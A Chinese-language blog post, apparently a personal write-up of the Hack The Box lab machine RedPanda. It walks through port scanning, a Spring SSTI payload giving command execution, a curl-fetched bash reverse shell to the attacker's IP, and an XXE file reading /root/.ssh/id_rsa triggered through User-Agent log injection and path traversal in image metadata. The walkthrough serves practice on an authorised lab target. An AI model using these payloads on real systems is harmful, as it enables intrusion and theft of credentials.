@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="一直游到海水变蓝">
+    <meta name="author" content="FLow">
+    
+    <title>
+        
+            htb RedPanda复盘 |
+        
+        Flowww&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#000033","title":"Flowww's blog","author":"FLow","avatar":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","logo":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","favicon":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","about":"/about"},"first_screen":{"enable":true,"background_img":"/image/bg.svg","background_img_dark":"/images/bg.svg","description":"一直游到海水变蓝","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Flowww&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        htb RedPanda复盘
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">FLow</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-09-24</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Sep 24 2024 19:20:37 GMT+0800">2024-09-24</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/htb/">htb</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -sS -p- --min-rate=2000 10.10.11.170</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 16:21 HKT</span><br><span class="line">Warning: 10.10.11.170 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.11.170</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 64603 closed tcp ports (reset), 930 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br></pre></td></tr></table></figure>
+
+<p>端口扫描扫到8080端口，直接访问，有个&#x2F;search，然后目录扫描也能看到&#x2F;stats，可以看到一些图片的路径，还有两个作者名字，还有一个可以生成xml文件（没什么敏感内容）的功能</p>
+<p>然后看到网页源代码可以知道这个是个spring boot应用</p>
+<p>主要针对这个search，尝试了sql注入，无果，后来看到了官方引导，才知道存在SSTI（下次应该自己试出来）</p>
+<h4 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h4><p>输入<code>*&#123;8*7&#125;</code>，回显56，验证了ssti漏洞，在hacktricks找个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以命令执行</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924163217.png" ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─# cat /var/www/html/a.sh</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.14/8888 0&gt;&amp;1</span><br><span class="line">编写payload</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;curl http://10.10.16.14：9999/a.sh -o /tmp/a.sh&#x27;).getInputStream())&#125;</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;bash /tmp/a.sh&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到shell</p>
+<h4 id="靶机内信息搜集"><a href="#靶机内信息搜集" class="headerlink" title="靶机内信息搜集"></a>靶机内信息搜集</h4><p>&#x2F;opt文件夹下面有挺多东西的，要耐心翻找</p>
+<p>在<code>/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code>文件里面能够看到woodenk用户的账号密码，拿去登陆ssh，可以成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924164021.png" ></p>
+<p>然后实在太多东西，我跑了linpeas和pspy，主要是pspy64，可以看到</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165009.png" ></p>
+<p>root有执行有关final…的jar包，在&#x2F;opt下面，woodenk用户还会定时删除xml文件</p>
+<p>把jar包scp传输到本地，用jadx反编译了一下，看到了代码</p>
+<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165726.png" ></p>
+<p>需要审计，这部分我就是参考别人的wp努力理解可以怎么利用漏洞</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JDOMException, IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">log_fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/opt/panda_search/redpanda.log&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">log_reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(log_fd);</span><br><span class="line">        <span class="keyword">while</span> (log_reader.hasNextLine()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> log_reader.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (isImage(line)) &#123;</span><br><span class="line">                <span class="type">Map</span> <span class="variable">parsed_data</span> <span class="operator">=</span> parseLog(line);</span><br><span class="line">                System.out.println(parsed_data.get(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                <span class="type">String</span> <span class="variable">artist</span> <span class="operator">=</span> getArtist(parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">                System.out.println(<span class="string">&quot;Artist: &quot;</span> + artist);</span><br><span class="line">                <span class="type">String</span> <span class="variable">xmlPath</span> <span class="operator">=</span> <span class="string">&quot;/credits/&quot;</span> + artist + <span class="string">&quot;_creds.xml&quot;</span>;</span><br><span class="line">                addViewTo(xmlPath, parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>main函数按顺序调用几个函数，都是在上文自定义的</p>
+<hr>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseLog</span><span class="params">(String line)</span> &#123;</span><br><span class="line">        String[] strings = line.split(<span class="string">&quot;\\|\\|&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;status_code&quot;</span>, Integer.valueOf(Integer.parseInt(strings[<span class="number">0</span>])));</span><br><span class="line">        map.put(<span class="string">&quot;ip&quot;</span>, strings[<span class="number">1</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;user_agent&quot;</span>, strings[<span class="number">2</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;uri&quot;</span>, strings[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>parseLog函数就是读取<code>/opt/panda_search/redpanda.log</code>，然后把里面的参数用｜分割，再保存，形如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">405||10.10.16.14||Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0||/error</span><br></pre></td></tr></table></figure>
+
+<p>然后再main函数返回那个叫<code>uri</code>的参数，后面要用</p>
+<hr>
+<p>接着往下时getArtist函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getArtist</span><span class="params">(String uri)</span> <span class="keyword">throws</span> IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fullpath</span> <span class="operator">=</span> <span class="string">&quot;/opt/panda_search/src/main/resources/static&quot;</span> + uri;</span><br><span class="line">        <span class="type">File</span> <span class="variable">jpgFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fullpath);</span><br><span class="line">        <span class="type">Metadata</span> <span class="variable">metadata</span> <span class="operator">=</span> JpegMetadataReader.readMetadata(jpgFile);</span><br><span class="line">        <span class="keyword">for</span> (Directory dir : metadata.getDirectories()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Tag tag : dir.getTags()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tag.getTagName() == <span class="string">&quot;Artist&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> tag.getDescription();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;N/A&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数先将<code>/opt/panda_search/src/main/resources/static</code>和uri参数拼接出一个路径，加载那张图片，然后使用JpegMetadataReader读取图片里面的详细信息，相当于exiftool，如果图片解析出来有<code>Artist</code>字段，就返回，如果没有就返回空</p>
+<hr>
+<p>最后是addViewTo函数，path在main函数拼接好了，就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/credits/&quot; + artist + &quot;_creds.xml //artist字段是前面函数返回的</span><br></pre></td></tr></table></figure>
+
+<p>这个函数主要是解析xml文件，增加图像的计数次数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addViewTo</span><span class="params">(String path, String uri)</span> <span class="keyword">throws</span> JDOMException, IOException &#123;</span><br><span class="line">        <span class="type">SAXBuilder</span> <span class="variable">saxBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">        <span class="type">XMLOutputter</span> <span class="variable">xmlOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLOutputter</span>();</span><br><span class="line">        xmlOutput.setFormat(Format.getPrettyFormat());</span><br><span class="line">        <span class="type">File</span> <span class="variable">fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> saxBuilder.build(fd);</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getRootElement();</span><br><span class="line">        <span class="keyword">for</span> (Element el : rootElement.getChildren()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (el.getName() == <span class="string">&quot;image&quot;</span> &amp;&amp; el.getChild(<span class="string">&quot;uri&quot;</span>).getText().equals(uri)) &#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">totalviews</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).getText()) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Total views:&quot;</span> + Integer.toString(totalviews.intValue()));</span><br><span class="line">                rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).setText(Integer.toString(totalviews.intValue()));</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">views</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(el.getChild(<span class="string">&quot;views&quot;</span>).getText()));</span><br><span class="line">                el.getChild(<span class="string">&quot;views&quot;</span>).setText(Integer.toString(views.intValue() + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fd));</span><br><span class="line">        xmlOutput.output(doc, writer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就存在XXE漏洞，在网站点击导出表格的功能时，就会触发，而且在这里解析的文件路径path是可控的，我们可以通过控制uri的值，控制 <code>artist</code>值</p>
+<h4 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool shy.jpg -Artist=&quot;../home/woodenk/aaa&quot;</span><br></pre></td></tr></table></figure>
+
+<p>先自己准备一张图片，用工具增加Artist字段，然后上传到靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">woodenk@redpanda:~$ cat aaa_creds.xml </span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY pencer SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&gt; ]&gt;&lt;credits&gt;</span><br><span class="line">  &lt;author&gt;damian&lt;/author&gt;</span><br><span class="line">  &lt;image&gt;</span><br><span class="line">    &lt;uri&gt;../../../home/woodenk/shy.jpg&lt;/uri&gt;</span><br><span class="line">    &lt;hello&gt;&amp;pencer;&lt;/hello&gt;</span><br><span class="line">    &lt;views&gt;4&lt;/views&gt;</span><br><span class="line">  &lt;/image&gt;</span><br><span class="line">  &lt;totalviews&gt;4&lt;/totalviews&gt;</span><br><span class="line">&lt;/credits&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在靶机新建一个xml文件，里面使用到文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.170:8080 -H &quot;User-Agent: ||/../../../../../../../home/woodenk/shy.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<p>curl访问，增加字段到log文件，这一步是在控制uri</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">woodenk@redpanda:/opt/panda_search$ ^[[A</span><br><span class="line">cat redpanda.log </span><br><span class="line"></span><br><span class="line">200||10.10.16.14||||/../../../../../../../home/woodenk/shy.jpg||/</span><br></pre></td></tr></table></figure>
+
+<p>因为我们在UA头前面多插入了一个||，这样本来是第三个字段的ua头被我们控制成第四个，也就是uri</p>
+<p>最后访问网址触发功能点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.170:8080/export.xml?author=damian</span><br></pre></td></tr></table></figure>
+
+<p>等一会，再查看aaa_creds.xml，就能看到我们要读取到内容，接下来就是用id_rsa登陆root，结束。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924191714.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，第一次接触java的ssti，虽然这次是直接套payload，然后靶机内信息搜集也挺需要耐心的，代码审计触发xxe漏洞那块，一开始看wp还感觉很麻烦，自己写复盘一路顺下来才理解，学习了。</p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/htb/">htb</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/linux/">linux</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/09/13/htb-Shoppy%E5%A4%8D%E7%9B%98/"
+                                   title="htb Shoppy复盘"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">htb Shoppy复盘</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSTI%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">SSTI漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">靶机内信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">4.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="nav-number">5.</span> <span class="nav-text">提权操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">FLow</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
